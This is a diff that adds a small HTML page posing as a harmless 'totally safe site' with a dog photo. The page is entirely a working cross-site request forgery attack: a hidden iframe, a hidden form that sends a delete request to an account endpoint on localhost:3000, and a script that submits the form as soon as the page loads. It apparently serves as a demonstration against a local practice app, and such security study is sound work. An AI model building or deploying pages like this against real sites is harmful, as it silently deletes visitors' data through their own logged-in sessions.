@@ -1,0 +1,13 @@
+<html>
+<head>
+</head>
+<body>
+Hello and welcome to my totally safe site.
+<br /><img src="http://www.cutegoldenretrievers.com/wp-content/uploads/03211.jpg"><br />
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://localhost:3000/accounts/1' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='_method' value='delete'>
+  <input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+</body>
